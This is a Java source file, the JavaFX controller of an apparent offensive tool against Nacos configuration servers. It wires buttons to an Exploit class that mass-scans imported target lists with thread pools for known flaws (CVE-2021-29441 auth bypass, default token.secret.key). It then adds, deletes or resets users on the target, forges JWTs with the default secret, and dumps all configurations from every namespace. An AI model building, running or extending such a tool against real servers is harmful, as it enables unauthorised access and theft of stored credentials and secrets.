package org.fasnow.nacostool.ui.controller;

import com.alibaba.nacos.v2.config.server.model.ConfigInfo;
import com.alibaba.nacos.v2.console.model.Namespace;
import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.Event;
import javafx.fxml.FXML;
import javafx.scene.control.*;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.RowConstraints;
import org.fasnow.nacostool.*;
import org.fasnow.nacostool.ui.Application;

import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import static javafx.scene.layout.Region.USE_COMPUTED_SIZE;

public class NacosController {

    @FXML
    private TextArea detectLog;

    @FXML
    private Button batchSubmitBtn;

    @FXML
    private Button exportBtn;

    @FXML
    private TabPane tabs;

    @FXML
    private TextArea description;

    @FXML
    private Tab descTab;

    @FXML
    private TextField passwordField1;

    @FXML
    private TextField versionField;

    @FXML
    private TextField useAuthPasswordField;

    @FXML
    private TextField useTokenTokenField;

    @FXML
    private TextField threadField;

    @FXML
    private Button submitBtn;

    @FXML
    private Button importBtn;
    @FXML
    private Button addUserBtn;

    @FXML
    private Button dumpConfigBtn;
    @FXML
    private Button deleteUserBtn;
    @FXML
    private Button updateUserBtn;
    @FXML
    private TextArea batchDetectLog;

    @FXML
    private RadioButton useAuth;

    @FXML
    private RadioButton useVul;

    @FXML
    private TextArea dumpLog;

    @FXML
    private TextField usernameField1;

    @FXML
    private TextField url;

    @FXML
    private RadioButton useToken;

    @FXML
    private TextField useAuthUsernameField;

    @FXML
    private TextField fileField;

    @FXML
    private ComboBox<String> vulCB1;


    @FXML
    private TextArea logArea1;

    Exploit exploit = new Exploit();

    @FXML
    private GridPane basePanel;

    @FXML
    private Label aboutLabel;

    @FXML
    private Label proxyLabel;

    @FXML
    private Label proxyLabel2;

    private static final Map<String,String> vulNameMethodMap = new HashMap<>();


    private List<String> targets = new ArrayList<>();

    @FXML
    void initialize() {
        List<String> nameList = new ArrayList<>();
        List<String> descList = new ArrayList<>();
        for (Map.Entry<String, Vul> entry : Exploit.vuls.entrySet()) {
            Vul vul = entry.getValue();
            String vulName= vul.getName();
            vulNameMethodMap.put(vulName,entry.getKey());
            nameList.add(0,vulName);
            descList.add(
                    "漏洞名称: " + vulName + "\n\n" +
                    "影响版本: " + vul.getAffectedVersion() + "\n\n" +
                    "参考链接: " + vul.getRefUrl()
            );
        }
        if(nameList.size()>1){
            nameList.add(0,"All");
        }
        ObservableList<String> observableNames = FXCollections.observableArrayList(nameList);
        vulCB1.setItems(observableNames);
        vulCB1.getSelectionModel().selectFirst();
        description.setText(String.join("\n\n\n",descList));

        ToggleGroup toggleGroup = new ToggleGroup();
        useAuth.setToggleGroup(toggleGroup);
        useVul.setToggleGroup(toggleGroup);
        useToken.setToggleGroup(toggleGroup);

        exportBtn.setVisible(false);
        Utils.setGlobalFocusTraversal(false,basePanel);

        //添加菜单
        basePanel.addRow(0, Application.getMenuStage());
        RowConstraints rowConstraints = new RowConstraints();
        rowConstraints.setPrefHeight(USE_COMPUTED_SIZE);
        basePanel.getRowConstraints().add(0, rowConstraints); // 应用约束条件到新添加的行
    }

    public void submitBtnAction(Event event){
        String targetUrl = url.getText();
        if("".equals(targetUrl.trim())){
            return;
        }
        try {
            exploit.setTarget(targetUrl);
        } catch (Exception e) {
            detectLog.appendText(Log.formatStderr(e));
            Log.info(e.toString());
            return;
        }
        tabs.getSelectionModel().select(1);
        String vulName = vulCB1.getValue();
        String methodName = vulNameMethodMap.get(vulName);
        Class<?> clazz = Vuls.class;
        Method[] methods = clazz.getDeclaredMethods();
        CompletableFuture.supplyAsync(() -> {
            Platform.runLater(()->submitBtn.setDisable(true));
            try {
                String version = exploit.getVersion();
                Platform.runLater(()->versionField.setText(version));
            } catch (Exception e) {
                Platform.runLater(()->detectLog.appendText(Log.formatStderr(e)));
                return null;
            }
            for (Method method:methods) {
                try {
                    Result result;
                    if (method.getName().equals(methodName) || vulName.equals("All")) {
                        result = (Result) method.invoke(exploit);
                        Platform.runLater(()->detectLog.appendText(Log.formatStdout(result.isPassed(),targetUrl,Utils.getKeyByValue(vulNameMethodMap,method.getName()),result.getFeatureField())));
                    }
                }
                catch (Exception e) {
                    Platform.runLater(()->detectLog.appendText(Log.formatStderr(e)));
                }
            }
            return null;
        }).thenAccept(result -> {
            Platform.runLater(()->submitBtn.setDisable(false));
        });
    }
    public void batchSubmitBtnAction(Event event) {
        int threadNum =  Integer.parseInt(threadField.getText());
        if(threadNum<=0){
            batchDetectLog.appendText(Log.formatStderr(new Exception("错误的线程数")));
            return;
        }
        if(targets.size()==0){
            batchDetectLog.appendText(Log.formatStdout(false,"目标为空,请先导入目标"));
            return;
        }
        String vulName = vulCB1.getValue();
        String methodName = vulNameMethodMap.get(vulName);
        Class<?> clazz = Vuls.class;
        Method[] methods = clazz.getDeclaredMethods();
        ExecutorService executorService = Executors.newFixedThreadPool(threadNum);
        CompletableFuture.supplyAsync(() -> {
            Platform.runLater(()->batchSubmitBtn.setDisable(true));

            for (String targetUrl : targets) {
                for (Method method:methods) {
                    if (method.getName().equals(methodName) || vulName.equals("All")) {
                        executorService.execute(() -> {
                            try {
                                Result result;
                                Exploit exploit = new Exploit();
                                exploit.setTarget(targetUrl);
                                result = (Result) method.invoke(exploit);
                                Platform.runLater(()->batchDetectLog.appendText(Log.formatStdout(result.isPassed(),targetUrl,Utils.getKeyByValue(vulNameMethodMap,method.getName()),result.getFeatureField())));
                            }
                            catch (Exception e) {
                                Platform.runLater(()->batchDetectLog.appendText(Log.formatStderr(e)));
                            }
                        });
                    }
                }
            }
            return null;
        }).thenAccept(result->{
            Platform.runLater(()->batchSubmitBtn.setDisable(false));
            executorService.shutdown();
        });
    }

    public void importBtnAction(Event event){
        Map<String,List<String>> result = Utils.getTargetUrls();
        for (Map.Entry<String,List<String>> entry:
                result.entrySet()) {
            String filename = entry.getKey();
            if("".equals(filename)){
                return;
            }
            fileField.setText(filename);
            targets =  entry.getValue();
        }
        if(targets.size()==0){
            batchDetectLog.appendText(Log.formatStdout(false,"导入的目标不能为空"));
        }
    }

    public TextArea getLogTextarea(){
        return detectLog ;
    }

    @FXML
    void addUserBtn1Action(Event event) {
        String username = usernameField1.getText();
        String password = passwordField1.getText();
        CompletableFuture.supplyAsync(() -> {
            Platform.runLater(()->addUserBtn.setDisable(true));
            if(username.trim().equals("")||password.trim().equals("")){
                Platform.runLater(()->logArea1.appendText(Log.formatStdout(false,"用户名或密码不能为空")));
                return null;
            }
            try {
                exploit.setTarget(url.getText());
                Result r = exploit.addUser(username,password);
                Platform.runLater(()->logArea1.appendText(Log.formatStdout(false,r.getFeatureField())));
            } catch (Exception e) {
                Platform.runLater(()->logArea1.appendText(Log.formatStderr(e)));
            }
            return null;
        }).thenAccept(result->{
            Platform.runLater(()->addUserBtn.setDisable(false));
        });

        //取消默认获取焦点
        Utils.setGlobalFocusTraversal(false,basePanel);
    }

    @FXML
    void deleteUserBtn1Action(Event event) {
        String username = usernameField1.getText();
        CompletableFuture.supplyAsync(() -> {
            Platform.runLater(()->deleteUserBtn.setDisable(true));
            if(username.trim().equals("")){
                Platform.runLater(()->logArea1.appendText(Log.formatStdout(false,"用户名不能为空")));
                return null;
            }
            try {
                exploit.setTarget(url.getText());
                Result r = exploit.deleteUser(username);
                Platform.runLater(()->logArea1.appendText(Log.formatStdout(false,r.getFeatureField())));
            } catch (Exception e) {
                Platform.runLater(()->logArea1.appendText(Log.formatStderr(e)));
            }
            return null;
        }).thenAccept(result->{
            Platform.runLater(()->deleteUserBtn.setDisable(false));
        });
    }

    @FXML
    void updateBtn1Action(Event event) {
        String username = usernameField1.getText();
        String password = passwordField1.getText();
        CompletableFuture.supplyAsync(() -> {
            Platform.runLater(()->updateUserBtn.setDisable(true));
            if(username.trim().equals("")||password.trim().equals("")){
                Platform.runLater(()->logArea1.appendText(Log.formatStdout(false,"用户名或密码不能为空")));
                return null;
            }
            try {
                exploit.setTarget(url.getText());
                Result r = exploit.resetPassword(username,password);
                Platform.runLater(()->logArea1.appendText(Log.formatStdout(false,r.getFeatureField())));
            } catch (Exception e) {
                Platform.runLater(()->logArea1.appendText(Log.formatStderr(e)));
            }
            return null;
        }).thenAccept(result->{
            Platform.runLater(()->updateUserBtn.setDisable(false));
        });
    }

    @FXML
    void useTokenAction(Event event) {

    }

    @FXML
    public void useVulAction(Event event) {

    }

    @FXML
    public void useAuthAction(Event event) {

    }

    @FXML
    void dumpConfigBtnAction(Event event) {
        String token = useTokenTokenField.getText();
        try {
            exploit.setTarget(url.getText());
        } catch (Exception e) {
            dumpLog.appendText(Log.formatStdout(false,e.toString()));
            return;
        }
        CompletableFuture.supplyAsync(() -> {
            Platform.runLater(()->dumpConfigBtn.setDisable(true));
            if(useAuth.isSelected()){
                String username = useAuthUsernameField.getText();
                String password = useAuthPasswordField.getText();
                if ("".equals(username)||"".equals(password)){
                    dumpLog.appendText(Log.formatStdout(false,"用户名或密码为空"));
                    return null;
                }
                try {
                    String authToken = exploit.login(username,password);
                    Platform.runLater(()->dumpLog.appendText(Log.formatStdout(true,"Authorization:"+authToken)));
                    List<Namespace> namespaces = exploit.getNamespacesWithAuthToken(authToken);
                    Platform.runLater(()->dumpLog.appendText(Log.formatStdout(true,"命名空间如下\n"+ Exploit.NamespaceListToString(namespaces))));
                    for (Namespace namespace : namespaces) {
                        int configCount = namespace.getConfigCount();
                        if(configCount==0){
                            continue;
                        }
                        List<ConfigInfo> configs = exploit.getConfigsWithAuthToken(authToken,namespace.getNamespace(),configCount);
                        Platform.runLater(()->dumpLog.appendText(Log.formatStdout(true,String.format("================%s================\n%s",namespace.getNamespaceShowName(), Exploit.ConfigListToString(configs)))));
                    }
                } catch (Exception e) {
                    Platform.runLater(()->dumpLog.appendText(Log.formatStdout(false,e.toString())));
                }
            }else if(useToken.isSelected()){
                if("".equals(token)){
                    Platform.runLater(()->dumpLog.appendText(Log.formatStdout(false,"token不能为空")));
                }
                try {
                    if(!exploit.validAuthToken(token)){
                        Platform.runLater(()->dumpLog.appendText(Log.formatStdout(false,"token无效")));
                        return null;
                    }
                    List<Namespace> namespaces = exploit.getNamespacesWithAuthToken(token);
                    Platform.runLater(()->dumpLog.appendText(Log.formatStdout(true,Exploit.NamespaceListToString(namespaces))));
                    for (Namespace namespace : namespaces) {
                        int configCount = namespace.getConfigCount();
                        if(configCount==0){
                            continue;
                        }
                        List<ConfigInfo> configs = exploit.getConfigsWithAuthToken(token,namespace.getNamespace(),configCount);
                        Platform.runLater(()->dumpLog.appendText(Log.formatStdout(true,String.format("================%s================\n%s",namespace.getNamespaceShowName(), Exploit.ConfigListToString(configs)))));
                    }

                } catch (Exception e) {
                    Platform.runLater(()->dumpLog.appendText(Log.formatStdout(false,e.toString())));
                }

            }else if(useVul.isSelected()){
                List<String> a = new ArrayList<>();
                a.add("权限认证绕过漏洞(CVE-2021-29441)");
                a.add("默认token.secret.key配置(QVD-2023-6271)");
                if(!a.contains(vulCB1.getValue())){
                    Platform.runLater(()->dumpLog.appendText(Log.formatStdout(false,"请右上方选择【权限认证绕过漏洞(CVE-2021-29441)】或者【默认token.secret.key配置(QVD-2023-6271)】")));
                    return null;
                }
                if(vulCB1.getValue().equals(a.get(0))){
                    try {
                        List<Namespace> namespaces = exploit.getNamespacesWithMisconfig();
                        Platform.runLater(()->dumpLog.appendText(Log.formatStdout(true,Exploit.NamespaceListToString(namespaces))));
                        for (Namespace namespace : namespaces) {
                            int configCount = namespace.getConfigCount();
                            if(configCount==0){
                                continue;
                            }
                            List<ConfigInfo> configs = exploit.getConfigsWithMisconfig(namespace.getNamespace(),configCount);
                            Platform.runLater(()->dumpLog.appendText(Log.formatStdout(true,String.format("================%s================\n%s",namespace.getNamespaceShowName(), Exploit.ConfigListToString(configs)))));
                        }
                    } catch (Exception e) {
                        Platform.runLater(()->dumpLog.appendText(Log.formatStdout(false,e.toString())));
                    }
                }else if(vulCB1.getValue().equals(a.get(1))){
                    String t = Jwt.generateJwt(Utils.getRandomString(8));
                    Platform.runLater(()->dumpLog.appendText(Log.formatStdout(true,"本地生成生成token: "+t)));
                    try {
                        if(!exploit.validAuthToken(t)){//抛出异常，不用return
                            Platform.runLater(()->dumpLog.appendText(Log.formatStdout(false,"非默认token.secret.key")));
                        }
                        List<Namespace> namespaces = exploit.getNamespacesWithAuthToken(t);
                        Platform.runLater(()->dumpLog.appendText(Log.formatStdout(true,Exploit.NamespaceListToString(namespaces))));
                        for (Namespace namespace : namespaces) {
                            int configCount = namespace.getConfigCount();
                            if(configCount==0){
                                continue;
                            }
                            List<ConfigInfo> configs = exploit.getConfigsWithAuthToken(t,namespace.getNamespace(),configCount);
                            Platform.runLater(()->dumpLog.appendText(Log.formatStdout(true,String.format("================%s================\n%s",namespace.getNamespaceShowName(), Exploit.ConfigListToString(configs)))));
                        }
                    } catch (Exception e) {
                        Platform.runLater(()->dumpLog.appendText(Log.formatStdout(false,e.toString())));
                    }
                }

            }

            return null;
        }).thenAccept(result->{
            Platform.runLater(()->dumpConfigBtn.setDisable(false));
        });


    }

    @FXML
    void exportBtnAction(Event event) {

    }
}
